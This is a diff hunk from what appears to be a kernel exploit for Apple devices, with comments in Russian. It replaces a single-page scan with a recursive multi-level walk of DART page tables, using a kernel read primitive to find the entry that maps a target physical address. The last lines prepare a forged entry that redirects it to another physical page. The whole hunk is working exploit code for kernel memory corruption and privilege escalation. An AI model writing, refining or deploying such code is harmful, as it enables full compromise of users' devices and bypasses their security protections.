@@ -6818,20 +6818,39 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 gptrs[gn++] = p;
             }
             kpNote(r, [NSString stringWithFormat:@"  [P2] dartObj: %d указателей (гейт отсеял %d) — скан страниц на PTE (PA-маска)", gn, gskip]);
-            for (int g = 0; g < gn && !pteVA; g++) {
-                uint32_t lim2 = 0x4000 - (uint32_t)(gptrs[g] & 0x3fff);
-                for (uint32_t o2 = 0; o2 + 8 <= lim2; o2 += 8) {
-                    uint64_t q = early_kread64(gptrs[g] + o2);
-                    if ((q & 0x000003FFFE000000ULL) != (backingPA & 0x000003FFFE000000ULL)) continue;
-                    if (!(q & ~0x000003FFFE000000ULL)) continue;   // голый PA без флагов — не PTE
-                    pteVA = gptrs[g] + o2;
-                    origPTE = q;
-                    kpNote(r, [NSString stringWithFormat:@"  [P2] ★ PTE @ %#llx (страница %#llx): %#018llx (флаги %#llx)",
-                              (unsigned long long)pteVA, (unsigned long long)gptrs[g],
-                              (unsigned long long)q, (unsigned long long)(q >> 51)]);
-                    break;
+            // 1.9.174: многоуровневый скан — leaf-таблицы на 2-3 хопа ниже корней.
+            // valid=bit0, child VA=(entry<<4)&0x3ffffffc000 (р.38). Visited-cap
+            // 64 + kvtophys на каждой странице — безопасно и без зацикливания.
+            __block uint64_t visited[64];
+            __block int nvis = 0;
+            __block void (^scanTbl)(uint64_t, int);
+            scanTbl = ^void(uint64_t tblVA, int depth) {
+                if (pteVA || depth > 3) return;
+                if (!kvtophys(tblVA)) return;
+                BOOL seen = NO;
+                for (int v = 0; v < nvis; v++) if (visited[v] == tblVA) { seen = YES; break; }
+                if (seen) return;
+                if (nvis < 64) visited[nvis++] = tblVA;
+                uint32_t lim = 0x4000 - (uint32_t)(tblVA & 0x3fff);
+                for (uint32_t o = 0; o + 8 <= lim && !pteVA; o += 8) {
+                    uint64_t q = early_kread64(tblVA + o);
+                    if ((q & 0x000003FFFE000000ULL) == (backingPA & 0x000003FFFE000000ULL) &&
+                        (q & ~0x000003FFFE000000ULL)) {
+                        pteVA = tblVA + o;
+                        origPTE = q;
+                        kpNote(r, [NSString stringWithFormat:@"  [P2] ★ PTE @ %#llx (глубина %d): %#018llx (флаги %#llx)",
+                                  (unsigned long long)pteVA, depth, (unsigned long long)q, (unsigned long long)(q >> 51)]);
+                        return;
+                    }
+                    if (depth < 3 && (q & 1)) {
+                        uint64_t child = (q << 4) & 0x3ffffffc000ULL;
+                        if (kpLooksLikeKernelPointer(child) && child != tblVA) scanTbl(child, depth + 1);
+                        if (pteVA) return;
+                    }
                 }
-            }
+            };
+            for (int g = 0; g < gn && !pteVA; g++) scanTbl(gptrs[g], 0);
+            if (!pteVA) kpNote(r, [NSString stringWithFormat:@"  [P2] многоуровневый скан: %d страниц обойдено, PTE нет", nvis]);
         }
         if (pteVA) {
             uint64_t newPTE = (origPTE & ~0x000003FFFE000000ULL) | (ctlPA & 0x000003FFFE000000ULL);
